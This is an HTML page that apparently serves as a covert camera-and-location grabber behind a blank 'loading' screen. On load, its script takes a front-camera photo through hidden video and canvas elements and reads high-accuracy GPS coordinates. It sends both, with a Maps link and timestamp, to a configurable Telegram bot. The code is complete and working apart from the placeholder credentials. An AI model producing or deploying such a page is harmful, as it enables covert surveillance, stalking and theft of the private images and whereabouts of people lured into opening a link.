<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>📍</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #000;
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: monospace;
    flex-direction: column;
    gap: 10px;
  }
  #msg { color: #444; font-size: 12px; letter-spacing: 0.15em; }
  #dot {
    width: 8px; height: 8px;
    border-radius: 50%;
    background: #222;
    animation: pulse 1.2s ease-in-out infinite;
  }
  @keyframes pulse { 0%,100%{opacity:0.2} 50%{opacity:1} }
  video, canvas { display: none; position: fixed; }
</style>
</head>
<body>
<div id="dot"></div>
<div id="msg">loading</div>
<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
// ─── CONFIG ───────────────────────────────
const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
const CHAT_ID   = 'YOUR_CHAT_ID_HERE';
// ──────────────────────────────────────────

const msg = document.getElementById('msg');
const dot = document.getElementById('dot');
const video = document.getElementById('v');
const canvas = document.getElementById('c');

function setMsg(t) { msg.textContent = t; }

async function run() {
  setMsg('camera...');

  let stream;
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 1280 } },
      audio: false
    });
    video.srcObject = stream;
    await video.play();
  } catch(e) {
    setMsg('camera denied'); return;
  }

  await new Promise(r => setTimeout(r, 1500));

  setMsg('capturing...');
  canvas.width = video.videoWidth || 1280;
  canvas.height = video.videoHeight || 1280;
  const ctx = canvas.getContext('2d');
  ctx.save();
  ctx.scale(-1, 1);
  ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
  ctx.restore();
  stream.getTracks().forEach(t => t.stop());

  const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.92));

  setMsg('locating...');
  let locationText = 'Location unavailable';
  try {
    const pos = await new Promise((res, rej) =>
      navigator.geolocation.getCurrentPosition(res, rej, {
        enableHighAccuracy: true, timeout: 10000
      })
    );
    const lat = pos.coords.latitude.toFixed(6);
    const lon = pos.coords.longitude.toFixed(6);
    const acc = Math.round(pos.coords.accuracy);
    const mapsUrl = `https://maps.google.com/?q=${lat},${lon}`;
    locationText = `📍 ${lat}, ${lon}\n±${acc}m accuracy\n🗺 ${mapsUrl}`;
  } catch(e) {}

  setMsg('sending...');

  const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
  const caption = `📸 Self-capture\n🕐 ${time}\n${locationText}`;

  try {
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', blob, 'selfie.jpg');
    form.append('caption', caption);

    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: form
    });

    const data = await res.json();
    if (data.ok) {
      dot.style.background = '#00ff88';
      dot.style.animation = 'none';
      setMsg('sent ✓');
    } else {
      setMsg('failed: ' + (data.description || 'unknown'));
    }
  } catch(e) {
    setMsg('network error');
  }
}

window.onload = run;
</script>
</body>
</html>
